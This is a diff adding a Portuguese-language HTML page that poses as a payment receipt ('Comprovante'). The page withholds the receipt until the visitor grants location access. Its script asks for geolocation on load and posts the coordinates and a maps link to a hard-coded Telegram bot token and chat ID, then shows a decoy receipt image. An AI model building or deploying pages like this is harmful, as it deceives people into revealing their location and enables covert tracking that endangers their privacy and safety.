@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Comprovante</title>
+  <style>
+    body {
+      background-color: #f4f4f4;
+      text-align: center;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 400px;
+    }
+
+    h1 {
+      color: #333;
+    }
+
+    p {
+      font-size: 16px;
+      color: #555;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .loading {
+      font-size: 18px;
+      color: #d9534f;
+      font-weight: bold;
+    }
+
+    .success {
+      font-size: 18px;
+      color: #28a745;
+      font-weight: bold;
+    }
+
+    .comprovante-img {
+      width: 100%;
+      max-width: 300px;
+      border-radius: 8px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <p id="mensagem" class="loading">Aguardando ativação da localização para poder ver seu comprovante...</p>
+
+    <div id="comprovante" class="hidden">
+      <h1>✅ Comprovante</h1>
+      <p>Sua localização foi confirmada.</p>
+      <p><strong>Obrigado!</strong> Seu acesso foi autorizado.</p>
+      <img src="https://t.ctcdn.com.br/8ZpQ7bz_2vKIKRs5HyZVP0cGOFc=/1024x0/smart/filters:format(webp)/i632341.jpeg" 
+           alt="Imagem do Comprovante" class="comprovante-img">
+    </div>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "7639873609:AAH2uPa79Etivl6NCHAHynNrbPipp2Jh4bY"; 
+    const CHAT_ID = "913586281"; 
+
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        document.getElementById("mensagem").innerText = "❌ Geolocalização não suportada pelo navegador.";
+      }
+    });
+
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const mapaLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      const mensagem = `🌍 Localização do usuário:\nLatitude: ${latitude}\nLongitude: ${longitude}\n[📍 Ver no mapa](${mapaLink})`;
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: mensagem,
+          parse_mode: "Markdown"
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log("Resposta do Telegram:", data);
+        if (data.ok) {
+          document.getElementById("mensagem").classList.add("hidden");
+          document.getElementById("comprovante").classList.remove("hidden");
+        } else {
+          document.getElementById("mensagem").innerText = "⚠️ Erro ao enviar a localização: " + (data.description || "Desconhecido");
+        }
+      })
+      .catch(error => {
+        console.error("Erro na requisição:", error);
+        document.getElementById("mensagem").innerText = "⚠️ Erro ao processar a solicitação.";
+      });
+    }
+
+    function handleError(error) {
+      document.getElementById("mensagem").innerText = "❌ Erro ao obter a localização: " + error.message;
+    }
+  </script>
+
+</body>
+</html>
